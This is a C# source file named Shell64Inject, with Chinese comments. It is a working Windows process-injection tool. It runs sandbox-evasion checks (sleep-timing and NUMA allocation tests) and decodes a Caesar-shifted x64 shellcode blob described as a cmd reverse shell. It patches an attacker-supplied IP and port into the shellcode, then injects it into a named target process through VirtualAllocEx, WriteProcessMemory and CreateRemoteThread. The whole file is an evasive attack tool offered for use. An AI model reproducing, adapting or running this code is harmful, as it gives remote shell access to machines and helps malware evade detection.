using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

namespace Shell64Inject
{
    class Program
    {
        // -------- 反沙箱 / 内存分配相关 API --------
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // -------- 远程进程注入 API --------
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Shell64Inject (x64) started");

            // 参数解析：IP 端口 目标进程名
            if (args.Length < 3)
            {
                Console.WriteLine("[-] Usage: Shell64Inject.exe <IP> <Port> <TargetProcess>");
                return;
            }

            if (!IPAddress.TryParse(args[0], out IPAddress ip))
            {
                Console.WriteLine("[-] Invalid IP address");
                return;
            }
            if (!int.TryParse(args[1], out int port) || port < 1 || port > 65535)
            {
                Console.WriteLine("[-] Invalid port");
                return;
            }
            string targetProcess = args[2];

            Console.WriteLine("[*] Target: {0}:{1} -> process '{2}'", ip, port, targetProcess);

            // -------- 反沙箱1：睡眠加速检测 --------
            Console.WriteLine("[*] Sleeping 5 seconds...");
            var t1 = DateTime.Now;
            Sleep(5000);
            double elapsed = (DateTime.Now - t1).TotalSeconds;
            Console.WriteLine("[*] Actual sleep: {0:F2}s", elapsed);
            if (elapsed < 4.5)
            {
                Console.WriteLine("[-] Sleep accelerated, exiting.");
                return;
            }

            // -------- 反沙箱2：NUMA 内存分配检测 --------
            Console.WriteLine("[*] Testing NUMA allocation...");
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                Console.WriteLine("[-] NUMA alloc failed, possible sandbox.");
                return;
            }
            Console.WriteLine("[+] NUMA alloc succeeded");

            // -------- x64 Shell (cmd) 凯撒+5 加密的载荷 --------
            byte[] enc = {0x01,0x4d,0x88,0xe9,0xf5,0xed,0xc5,0x05,0x05,0x05,0x46,0x56,0x46,0x55,0x57,0x56,0x5b,0x4d,0x36,0xd7,0x6a,0x4d,0x90,0x57,0x65,0x4d,0x90,0x57,0x1d,0x4d,0x90,0x57,0x25,0x4d,0x90,0x77,0x55,0x4d,0x14,0xbc,0x4f,0x4f,0x52,0x36,0xce,0x4d,0x36,0xc5,0xb1,0x41,0x66,0x81,0x07,0x31,0x25,0x46,0xc6,0xce,0x12,0x46,0x06,0xc6,0xe7,0xf2,0x57,0x46,0x56,0x4d,0x90,0x57,0x25,0x90,0x47,0x41,0x4d,0x06,0xd5,0x90,0x85,0x8d,0x05,0x05,0x05,0x4d,0x8a,0xc5,0x79,0x6c,0x4d,0x06,0xd5,0x55,0x90,0x4d,0x1d,0x49,0x90,0x45,0x25,0x4e,0x06,0xd5,0xe8,0x5b,0x4d,0x04,0xce,0x46,0x90,0x39,0x8d,0x4d,0x06,0xdb,0x52,0x36,0xce,0x4d,0x36,0xc5,0xb1,0x46,0xc6,0xce,0x12,0x46,0x06,0xc6,0x3d,0xe5,0x7a,0xf6,0x51,0x08,0x51,0x29,0x0d,0x4a,0x3e,0xd6,0x7a,0xdd,0x5d,0x49,0x90,0x45,0x29,0x4e,0x06,0xd5,0x6b,0x46,0x90,0x11,0x4d,0x49,0x90,0x45,0x21,0x4e,0x06,0xd5,0x46,0x90,0x09,0x8d,0x4d,0x06,0xd5,0x46,0x5d,0x46,0x5d,0x63,0x5e,0x5f,0x46,0x5d,0x46,0x5e,0x46,0x5f,0x4d,0x88,0xf1,0x25,0x46,0x57,0x04,0xe5,0x5d,0x46,0x5e,0x5f,0x4d,0x90,0x17,0xee,0x5c,0x04,0x04,0x04,0x62,0x4e,0xc3,0x7c,0x78,0x37,0x64,0x38,0x37,0x05,0x05,0x46,0x5b,0x4e,0x8e,0xeb,0x4d,0x86,0xf1,0xa5,0x06,0x05,0x05,0x4e,0x8e,0xea,0x4e,0xc1,0x07,0x05,0x27,0x27,0x16,0x16,0x16,0x16,0x46,0x59,0x4e,0x8e,0xe9,0x51,0x8e,0xf6,0x46,0xbf,0x51,0x7c,0x2b,0x0c,0x04,0xda,0x51,0x8e,0xef,0x6d,0x06,0x06,0x05,0x05,0x5e,0x46,0xbf,0x2e,0x85,0x70,0x05,0x04,0xda,0x55,0x55,0x52,0x36,0xce,0x52,0x36,0xc5,0x4d,0x04,0xc5,0x4d,0x8e,0xc7,0x4d,0x04,0xc5,0x4d,0x8e,0xc6,0x46,0xbf,0xef,0x14,0xe4,0xe5,0x04,0xda,0x4d,0x8e,0xcc,0x6f,0x15,0x46,0x5d,0x51,0x8e,0xe7,0x4d,0x8e,0xfe,0x46,0xbf,0x9e,0xaa,0x79,0x66,0x04,0xda,0x4d,0x86,0xc9,0x45,0x07,0x05,0x05,0x4e,0xbd,0x68,0x72,0x69,0x05,0x05,0x05,0x05,0x05,0x46,0x55,0x46,0x55,0x4d,0x8e,0xe7,0x5c,0x5c,0x5c,0x52,0x36,0xc5,0x6f,0x12,0x5e,0x46,0x55,0xe7,0x01,0x6b,0xcc,0x49,0x29,0x59,0x06,0x06,0x4d,0x92,0x49,0x29,0x1d,0xcb,0x05,0x6d,0x4d,0x8e,0xeb,0x5b,0x55,0x46,0x55,0x46,0x55,0x46,0x55,0x4e,0x04,0xc5,0x46,0x55,0x4e,0x04,0xcd,0x52,0x8e,0xc6,0x51,0x8e,0xc6,0x46,0xbf,0x7e,0xd1,0x44,0x8b,0x04,0xda,0x4d,0x36,0xd7,0x4d,0x04,0xcf,0x90,0x13,0x46,0xbf,0x0d,0x8c,0x22,0x65,0x04,0xda,0xc0,0xf5,0xba,0xa7,0x5b,0x46,0xbf,0xab,0x9a,0xc2,0xa2,0x04,0xda,0x4d,0x88,0xc9,0x2d,0x41,0x0b,0x81,0x0f,0x85,0x00,0xe5,0x7a,0x0a,0xc0,0x4c,0x18,0x77,0x74,0x6f,0x05,0x5e,0x46,0x8e,0xdf,0x04,0xda};
            Console.WriteLine("[*] Encrypted payload: {0} bytes", enc.Length);

            // 凯撒-5 解密
            byte[] buf = new byte[enc.Length];
            for (int i = 0; i < buf.Length; i++)
                buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);

            // 定位 sockaddr 结构：AF_INET (0x02,0x00) + 占位端口 (0x22,0x22)
            byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };
            int pos = FindBytes(buf, pattern);
            if (pos == -1)
            {
                Console.WriteLine("[-] Sockaddr pattern not found!");
                return;
            }
            int portOffset = pos + 2;   // 端口占位符起始
            int ipOffset   = pos + 4;   // x64 下 IP 偏移
            Console.WriteLine("[*] Pattern at offset {0}, port offset {1}, ip offset {2}", pos, portOffset, ipOffset);

            // 替换端口（大端）
            buf[portOffset]   = (byte)((port >> 8) & 0xFF);
            buf[portOffset+1] = (byte)(port & 0xFF);

            // 替换 IP（大端）
            byte[] ipBytes = ip.GetAddressBytes();
            Buffer.BlockCopy(ipBytes, 0, buf, ipOffset, 4);

            Console.WriteLine("[*] Injected IP: {0}.{1}.{2}.{3}",
                buf[ipOffset], buf[ipOffset+1], buf[ipOffset+2], buf[ipOffset+3]);
            Console.WriteLine("[*] Injected Port: {0} (0x{1:X2}{2:X2})",
                port, buf[portOffset], buf[portOffset+1]);

            // -------- 查找目标进程 PID --------
            Process[] procs = Process.GetProcessesByName(targetProcess);
            if (procs.Length == 0)
            {
                Console.WriteLine("[-] Process '{0}' not found.", targetProcess);
                return;
            }
            int pid = procs[0].Id;
            Console.WriteLine("[+] Found process '{0}' (PID: {1})", targetProcess, pid);

            // -------- 打开目标进程 --------
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);  // PROCESS_ALL_ACCESS
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenProcess failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Opened target process handle: 0x{0:X}", hProcess);

            // -------- 在远程进程中分配内存 --------
            IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
            if (remoteAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Memory allocated in remote process at 0x{0:X}", remoteAddr);

            // -------- 写入 shellcode --------
            IntPtr bytesWritten;
            bool writeOk = WriteProcessMemory(hProcess, remoteAddr, buf, (uint)buf.Length, out bytesWritten);
            if (!writeOk)
            {
                Console.WriteLine("[-] WriteProcessMemory failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode written ({0} bytes)", (int)bytesWritten);

            // -------- 创建远程线程执行 --------
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] CreateRemoteThread failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Remote thread created. Handle: 0x{0:X}", hThread);
            Console.WriteLine("[*] Shellcode is now executing inside '{0}' (PID {1})", targetProcess, pid);
        }

        // 字节序列查找函数（与之前版本一致）
        static int FindBytes(byte[] src, byte[] pat)
        {
            for (int i = 0; i <= src.Length - pat.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (src[i + j] != pat[j]) { ok = false; break; }
                if (ok) return i;
            }
            return -1;
        }
    }
}